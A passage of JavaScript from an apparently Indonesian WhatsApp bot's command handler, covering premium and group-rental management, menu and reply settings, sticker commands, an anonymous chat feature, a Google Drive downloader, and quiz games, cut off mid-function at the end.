setReply(teks)
}
break



case 'addprem':{
if (!isOwner) return onlyOwner()
if(isGroup && users){
if(!q) return setReply(`Penggunaan :\n${prefix}addprem\n\nPilih waktu\ns = detik\nh = jam\nd =hari`)
if(mentionByReply){
var waktunya = q	
 } else if(mentionByTag) {
var waktunya = q.split(" ")[1] || q.split("|")[1]
if(waktunya == undefined) return setReply("masukan waktu\ns = detik\nh = jam\nd =hari")
 }
 _prem.addPremiumUser(users, waktunya, premium)
let teks =`
Success
📛 *Number:* ${users.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunya))}
📉 *Countdown:* ${toMs(waktunya)}`

setReply(teks)
await conn.sendButMessage(users, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
	
} else if(!isGroup){
let usernya = q.split("|")[0].replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
let waktunye = q.split("|")[1]
let teks =`
Success
📛 *Number:* ${usernya.split("@")[0]}
📆 *Days:* ${conn.msToDate(toMs(waktunye))}
📉 *Countdown:* ${toMs(waktunye)}`
_prem.addPremiumUser (usernya, waktunye, premium)
await setReply(teks)
await conn.sendButMessage(usernya, `HALO KAK AKU *${fake}*\nkamu telah terdaftar sabagai user premium\nterimakasih sudah menggunakan ${fake}`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}cekprem`, buttonText: {displayText: `ᴄᴇᴋ ᴘʀᴇᴍ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
} else setReply("Tag atau Reply usernya")
}
break

case 'delprem':
if (!isOwner) return onlyOwner()
if(Input){
if(!_prem.checkPremiumUser (Input, premium)) return setReply("Maap kak user tersebut tidak ada di database") 
_prem.delPremiumUser (Input, premium)
setReply(`Succes delete premium ${Input.split("@")[0]}`)          
} else setReply("Tag/Reply/Input nomer target")
break    
    
case 'listprem':{
let txt = `*── 「 LIST PREMIUM 」 ──*\nTotal : ${premium.length}\n\n`
let men = [];
for (let i of premium){
Log(i.id)
men.push(i.id)
let cekvip = ms(i.expired - Date.now())
txt += `*ID :* ${i.id.split("@")[0]}\n*Expired :* ${cekvip.days} Hari ${cekvip.hours} Jam ${cekvip.minutes} Menit ${cekvip.seconds} Detik\n\n`
}
setReply(txt, men)
}
break


    
case 'setreply':{
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(replyType === "web") return setReply("Udah aktif")
replyType = "web"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'mess'){
if(replyType === "mess") return setReply("Udah aktif")
replyType = "mess"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(replyType === "troli") return setReply("Udah aktif")
replyType = "troli"
setReply(`Berhasil mengubah set reply ke ${q}`)
}  else if ((args[0]) === 'quoted' ){
if(replyType === 'quoted') return setReply("Udah aktif")
replyType = "quoted"
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
conn.sendButMessage(from, `SETTING REPLY\n1. web\n2. troli\n3. mess\n4. vidio\n5. quoted\n`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ϙᴜᴏᴛᴇᴅ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
} else {
replyType = q
setReply("Set Reply Tidak Di Temukan")
}
}
break

case   'listcmdblock':    
case 'listblockcmd':{
let wo = `*「 LIST BLOCK CMD 」*`
let soso = [];
for (let i of listcmdblock) {
soso.push(i.cmd)
wo += `\n\n•> Command : ${i.cmd}`
}
setReply(wo)
}
break


case 'setmenu':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'troli'|| (args[0]) === 'troli' ){
setmenu = "troli"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
setmenu = "katalog"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else  if ((args[0]) === 'lokasi2'|| (args[0]) === 'prolocation2' ){
setmenu = "location2"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image'|| (args[0]) === 'img' ){
setmenu = "image"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'lokasi' ){
setmenu = "location"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'image2'|| (args[0]) === 'img2' ){
setmenu = "image2"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}else if ((args[0]) === 'pptx'){
docType = "pptx"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'xlsx'){
docType = "xlsx"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'zip'){
docType = "zip"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'pdf'){
docType = "pdf"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'docx'){
docType = "docx"
setmenu = "document"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
} else if ((args[0]) === 'gif'){
setmenu = "gif"
await conn.sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
//{buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}],setQuoted);
}  else if (!q) {
conn.sendButMessage(from, `SETTING MENU\n1.lokasi\n2.lokasi2\n3.img\n4.Pptx\n5.Xlsx\n6.Zip\n7.Pdf\n8.Docx\n9.gif\n10.troli`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
{buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}],setQuoted);
} else {
setReply("Menu tidak di temukan om")
}
break


case 'setimgreply':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/reply.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image reply`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
}
}
break

    case 'setimgbc':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/bc.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image bc`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimagebc`);
}
}
break
    
case 'listowner':{
if(!_data.checkDataName("owner", q, DataId)) { await _data.createDataId("owner", DataId) }
let nana = await DataId.filter(item => item.name == "owner" )
if(!nana) return setReply("Tidak ada")
let teks ="List Owner\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`- wa.me/${i.split("@")[0]} \n`   
}    
setReply(teks)
}
break   

case 'patrick':
if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
conn.sendImageAsSticker(from, pjr, m)
}
)
break

case 'gura':
if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
conn.sendImageAsSticker(from, pjr, m)
}
)
break

case 'doge':
if (!isGroup) return setReply(mess.only.group)
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
//conn.sendMedia (from, pjr, m, {caption: "Nih"})
conn.sendImageAsSticker(from, pjr, m)
}
)
break


case 'addsewa':{
if(!isGroup){
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let LinkGc = q.split(" ")[0];
let Second = q.split(" ")[1];
let code = LinkGc.match(rex1);
if (code == null) return  setReply("No invite url detected.");
let kode = code[0].replace("chat.whatsapp.com/", "");
await conn.groupAcceptInvite(kode)
let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(kode).catch(async () => {
return setReply("Invalid invite url.");
});
let teks =`
Success
*Name:* ${subject}
*Id:* ${id}
*Days:* ${conn.msToDate(toMs(Second))}
*Countdown:* ${toMs(Second)}`
setReply(teks)
await conn.sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}],setQuoted);
await _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
} else if(isGroup){
if(!q) return setReply("Maukian angka 1m/1d/1h")
if (isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(!isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} 
_sewa.addSewaGroup(from, groupName, yeh, q, sewa)
setReply("Berhasil Add Sewa ke group")
}
}
break

case 'ceksewa':
case  'sewacek':
if (!isGroup) return setReply(mess.only.group)
if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
setReply(sewenye)
break    

case 'start': {
//if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")

if (room) {
await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await conn.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`})
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
let teks =`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`

let mok = [{"buttonId": `${prefix}invite`,"buttonText": {"displayText": `Invite`},"type": "RESPONSE"},
{"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `ᴋᴇʟᴜᴀʀ`},"type": "RESPONSE"}]

conn.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), mok)
}

}
break


case 'stop':
case 'keluar': {
//if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')
if(roomA && roomA.state == "CHATTING"){

await conn.sendMessage(roomA.b, {text:"Partnermu telah meninggalkan room anonymous"})
await setTimeout(() => {
setReply("Kamu telah keluar dari room anonymous")
roomA.a = roomA.b
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

},1000)

} else if(roomA && roomA.state == "WAITING"){
setReply("Kamu telah keluar dari room anonymous")
//anonChat.splice(roomA, 1)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

anonChat.splice(anonChat.indexOf(roomA, 1))
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

} else if(roomB && roomB.state == "CHATTING"){
await conn.sendMessage(roomB.a,{text:`Partnermu telah meninggalkan room anonymous`})
setReply("Kamu telah keluar dari room anonymous dan meninggalkan partner mu")

roomB.b =""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))


} else setReply(`Kamu sedang tidak berada di room anonymous, tekan button untuk mencari partner`)


}
break


case 'next':{
//if (isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')

//Posisi di room A sedang waiting
if (roomA && roomA.state == "WAITING" ) {
setReply("Mencari Partner...")
anonChat.splice(roomA, 1)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await conn.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000)

//Posisi Room A sedang cattingan
} else if(roomA && roomA.state == "CHATTING" ){
await conn.sendMessage(roomA.b, {text: "Partnermu telah mengeluarkanmu dari room Anonymous"})
setReply("Kamu telah mengeluarkan partnermu dari room anonymous ")
await setTimeout(() => {
setReply("Menunggu partner masuk ke dalam room")
roomA.b = ""
roomA.state = "WAITING"
roomA.expired = Date.now() + toMs("5m")
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
},1000)

//Posisi di Room B sedang chattingan
} else if(roomB){
await conn.sendMessage(roomB.a, {text: "Partner telah meninggalkan room anonymous mu"})
setReply("Mohon tunggu sedang mencari room")
roomB.b =  ""
roomB.state = "WAITING"
roomB.expired = Date.now() + toMs("5m")
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

await setTimeout( async () => {
if ( Object.values(anonChat).find(room => room.state === 'WAITING' && room.b == "")) {
await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await conn.sendMessage(room.b,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired : Date.now() + toMs("5m")
}
anonChat.push(obj)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room baru\nSilakan tunggu partner masuk ke dalam room`)
}
}, 2000)
} else setReply("Kamu sedang tidak berada di dalam room anonymous")



}
break

case 'sendkontak': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Untuk Group!')

if (roomA && roomA.state == "CHATTING") {
let profile = await conn.profilePictureUrl(roomA.a)
let status = await conn.fetchStatus(roomA.a)
let msg = await conn.sendImage(roomA.b, profile, `Nama : ${await conn.getName(roomA.a)}\nBio : ${status.status}\nUser : @${roomA.a.split("@")[0]}`, m, { mentions: [roomA.a] })
conn.sendContact(roomA.b, roomA.a.split("@")[0], await conn.getName(roomA.a))

} else if(roomB && roomB.state == "CHATTING"){
//let profile = await conn.profilePictureUrl(roomB.b)
//let status = await conn.fetchStatus(roomB.b)
//let msg = await conn.sendImage(roomB.a, profile, `Nama : ${await conn.getName(roomB.b)}\nBio : ${status.status}\nUser : @${roomB.b.split("@")[0]}`, m, { mentions: [roomB.b] })
conn.sendContact(roomB.a, roomB.b.split("@")[0],await conn.getName(roomB.b))

} else if(roomA == "undefined" || roomB == "undefined" ){
setReply("Kamu sedang tidak berada di room anonymous")

} else setReply("Kamu belum dapat mengirim kontak karena kamu belum punya partner")

}
break


case 'startchat': {
if (isGroup) return setReply('Fitur Tidak Dapat Digunakan Di Dalam Group!')
if(!q) return setReply("Masukan nomer target yang mau di chat")
if (roomA || roomB ) return setReply("Kamu masih berada di dalam room anonymous,  ketik keluar untuk keluar dari room anonymous mu")
let id = + new Date
const obj = {
id,
a: m.sender,
b: Input,
state: "CHATTING",
expired: "INFINITY"
}

anonChat.push(obj)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
setReply(`Kamu telah membuat room anonymous\nDan menjadikan ${Input} sebagai partner mu\nSekarang kamu bisa mengirim pesan`)


}
break

case 'anonymous':{
//if(isGroup) return setReply("Tidak bisa di gunakan di dalam group")
let teks =`
Anonymous Chat adalah
fitur yang memungkinkan kamu
berinteraksi dengan user lain
tanpa mengetahui identitas user
dan terintegrasi secara acak.

Klik start untuk memulai`

let mok = [{"buttonId": `${prefix}start`,"buttonText": {"displayText": `sᴛᴀʀᴛ`},"type": "RESPONSE"},
{"buttonId": `${prefix}keluar`,"buttonText": {"displayText": `ᴋᴇʟᴜᴀʀ`},"type": "RESPONSE"}]

conn.sendButLoc(from, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), mok)

}
break



case 'invite':{
//if(isGroup) return setReply("Fitur tidak bisa di gunakan di dalam group")
if(!roomA) return setReply("Kamu sedang tidak berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let getGroups = await conn.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
let ana = groups.map(v => v.id)
let mem = [];
for (let i of ana) {
let data = await conn.groupMetadata(i)
let obj = { id : data.id, total : data.participants.length}
await mem.push(obj)
}
let groupInvite = await mem.filter(member => member.total > 50 )

let yesnih = [{"buttonId": `${prefix}joinchat ${roomA.id}`,"buttonText": {"displayText": `ᴊᴏɪɴ ᴄʜᴀᴛ`},"type": "RESPONSE"}
]

let teks = `
Seseorang telah mengundang kamu
untuk bergabung ke room anonymous chat
tekan tombol join chat di bawah ini untuk
bergabung di room anonymous dan memulai
sesi chat dengan user lain`
await conn.sendMessage(from, {text: `Mengirim undangan anonymous, waktu selesai ${groupInvite.length * 3 } detik`})

for (let i of groupInvite) {
await sleep(3000)
await conn.sendButLoc(i.id, teks,copyright,fs.readFileSync('./stik/anonymous.jpg'), yesnih)
}
await conn.sendMessage(from, {text: `Undangan telah terkirim ke ${groupInvite.length} group` })

}
break


case 'joinchat':{
if(!q) return setReply("Masukan id room anonymous")
if(roomA && roomA.state == "WAITING" ) return setReply("Kamu masih berada di room anonymous")
if(roomB && roomB.state == "CHATTING" || roomA && roomA.state == "CHATTING" ) return setReply("Kamu sudah berada di room anonymous dan sudah memulai sesi chat")
let joinRoom = Object.values(anonChat).find(room => room.id == q && room.state == "WAITING")
if (joinRoom) {
await conn.sendMessage(joinRoom.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await conn.sendMessage(joinRoom.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`})
setReply(`Berhasil join ke room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

} else if (room) {
await conn.sendMessage(room.a,{text: `Berhasil menemukan partner, sekarang kamu dapat mengirim pesan`})
room.b = m.sender
room.state = 'CHATTING'
room.expired = "INFINITY"
await conn.sendMessage(room.b,{text: `Berhasil Menemukan Partner, sekarang kamu dapat mengirim pesan`})
setReply(`Berhasil mendapatkan room, silakan cek di chat bot\nAtau bisa klik nomer di bawah ini untuk memulai sesi chat\n\nhttp://wa.me/${botNumber.split("@")[0]}`)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))

} else {
let id = + new Date
const obj = {
id,
a: m.sender,
b: '',
state: 'WAITING',
expired: Date.now() + toMs("5m")
}
anonChat.push(obj)
//fs.writeFileSync('./database/anonymous.json', JSON.stringify(anonChat))
await conn.sendMessage(sender,{text: `Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`})
setReply(`Kamu telah membuat room anonymous\nMohon tunggu sedang mencari partner`)
}


}
break

case 'listsewa': {
let ordernye = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvipp = ms(i.expired - Date.now())
ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${isOwner? i.linkgc : ""}\n\n`             
} 
ordernye += `© ${fake1}`
setReply(ordernye)
}
break

case 'cekprem':
case    'cekpremium':{
if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
setReply(premiumnya)
}
break


case 'setimgquoted':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/quoted.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image quoted`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break  


case 'gdrive': {
if (!isGroup) return setReply(mess.only.group)
const { sizeFormatter } = await import( 'human-readable')
let formatSize = sizeFormatter({
std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`
})

async function GDriveDl(url) {
let id
if (!(url && url.match(/drive\.google/i))) return setReply( 'Invalid URL')
id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
if (!id) return setReply( 'ID Not Found')
let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
method: 'post',
headers: {
'accept-encoding': 'gzip, deflate, br',
'content-length': 0,
'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
'origin': 'https://drive.google.com',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
'x-drive-first-party': 'DriveWebUi',
'x-json-requested': 'true'
}
})
let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
if (!downloadUrl) return setReply( 'Link Download Limit!')
let data = await fetch(downloadUrl)
if (data.status !== 200) throw data.statusText
return { downloadUrl, fileName, fileSize: formatSize(sizeBytes), mimetype: data.headers.get('content-type') }
}

if (!q) return setReply( 'Input URL' )
GDriveDl(args[0]).then(async (res) => {
if (!res) throw res
await m.reply(JSON.stringify(res, null, 2))
conn.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
})
}
break
    
case 'family100': {
if (!isGroup) return setReply(mess.only.group)
let winScore = 1000
let id = m.chat
if (id in conn.family) return setReply('Masih ada kuis yang belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `
*Soal:* ${json.soal}

Terdapat *${json.jawaban.length}* jawaban${json.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}

+${winScore} Money tiap jawaban benar
`.trim()
conn.family[id] = {
id,

msg: await m.reply(caption),
...json,
terjawab: Array.from(json.jawaban, () => false),
winScore,
}
}
break


case 'math': {
if (!isGroup) return setReply(mess.only.group)
let modes = {
noob: [-3, 3, -3, 3, '+-', 15000, 10],
easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
}

let operators = {
'+': '+',
'-': '-',
'*': '×',
'/': '÷'
}

function genMath(mode) {
let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
let a = randomInt(a1, a2)
let b = randomInt(b1, b2)
let op = pickRandom([...ops])
let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
if (op == '/') [a, result] = [result, a]
return {
str: `${a} ${operators[op]} ${b}`,
mode,
time,
bonus,
result
}
}

function randomInt(from, to) {
if (from > to) [from, to] = [to, from]
from = Math.floor(from)
to = Math.floor(to)
return Math.floor((to - from) * Math.random() + from)
}


// conn.math = conn.math ? conn.math : {}
if (!q) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────
contoh:
${prefix}math hard
`)
let mode = args[0].toLowerCase()
if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────
contoh:
${prefix}math hard
`)
let id = from
if (id in conn.math) return setReply('Masih ada soal belum terjawab di chat ini')
let math2 = genMath(mode)
conn.math[id] = [
await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp${math2.bonus} `),
math2, 4,
setTimeout(async () => {
//if (conn.math[id]) await conn.sendButton(from, `Waktu habis!\nJawabannya adalah ${math2.result}`, '', `${math2.mode.toUpperCase()}`, `.math ${math2.mode}`, conn.math[id][0])
